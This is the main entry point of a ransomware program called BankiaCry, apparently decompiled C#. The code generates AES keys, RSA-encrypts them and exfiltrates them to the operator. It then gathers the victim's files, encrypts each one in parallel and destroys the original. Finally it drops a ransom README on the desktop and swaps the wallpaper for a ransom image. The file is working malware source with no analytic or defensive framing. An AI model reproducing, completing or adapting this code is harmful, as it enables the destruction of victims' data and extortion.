using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using BankiaCry.Properties;

namespace BankiaCry;

internal class Program
{
	public static readonly uint SPI_SETDESKWALLPAPER = 20u;

	public static readonly uint SPIF_UPDATEINIFILE = 1u;

	public static readonly uint SPIF_SENDWININICHANGE = 2u;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	private static void Main(string[] args)
	{
		byte[] randomAESStuff = Config.GetRandomAESStuff();
		byte[] randomAESStuff2 = Config.GetRandomAESStuff();
		Exfil exfil = new Exfil();
		X509Certificate2 publicCert = Config.GetPublicCert();
		Crypter crypter = new Crypter(publicCert);
		MemoryStream memoryStream = crypter.RSAEncryptBytes(new MemoryStream(randomAESStuff2.Concat(randomAESStuff).ToArray()));
		bool flag = exfil.ExfiltratePass(memoryStream.ToArray());
		Console.WriteLine("No");
		Console.WriteLine("No");
		Console.WriteLine("No");
		Console.WriteLine("No");
		if (flag)
		{
			Mole mole = new Mole();
			List<string> source = mole.Dig();
			Crypter c = new Crypter(randomAESStuff, randomAESStuff2);
			Parallel.ForEach(source, delegate(string file)
			{
				c.AES_EncryptFile(file);
				Crypter.NukeFile(file);
			});
			c.CleanUp();
			try
			{
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\README!!!!.TXT", Config.GetReadmeContents());
				string text = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\n9fds8nifauh.jpeg";
				((Image)Resources.background).Save(text);
				SystemParametersInfo(SPI_SETDESKWALLPAPER, 0u, text, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
			}
			catch
			{
			}
		}
	}
}
